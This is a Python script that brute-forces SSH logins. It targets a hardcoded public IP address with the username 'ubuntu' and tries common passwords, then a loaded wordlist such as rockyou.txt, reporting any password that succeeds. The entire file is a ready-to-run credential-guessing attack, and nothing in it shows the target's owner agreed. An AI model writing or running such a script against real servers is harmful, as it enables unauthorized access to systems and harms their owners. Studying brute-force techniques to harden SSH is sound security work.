import paramiko
import time

# Target information
host = "184.72.156.160"
port = 22
username = "ubuntu"

# Password list for testing
passwords = [
    "password123",
    "admin",
    "ubuntu",
    "123456",
    "letmein",
    "incorrect_password"  # Add more passwords as needed
]


def ssh_brute_force(host, port, username, passwords):
    for password in passwords:
        try:
            print(f"Attempting password: {password}")
            # Create an SSH client
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

            # Try connecting
            ssh.connect(host, port=port, username=username, password=password, timeout=5)
            print(f"[+] Success! Password found: {password}")
            ssh.close()
            return True
        except paramiko.AuthenticationException:
            print(f"[-] Failed with password: {password}")
        except Exception as e:
            print(f"[!] Error: {str(e)}")
            break
        finally:
            time.sleep(1)  # Optional delay to avoid overwhelming the target
    print("[X] Brute force failed. No valid password found.")
    return False


# Run the brute force
# Load passwords from a file
def load_passwords(file_path):
    with open(file_path, 'r') as f:
        return [line.strip() for line in f]

# Use the loaded passwords
wordlist_path = "password_list.txt"  # e.g., rockyou.txt or 10k-most-common.txt
passwords = load_passwords(wordlist_path)
ssh_brute_force(host, port, username, passwords)

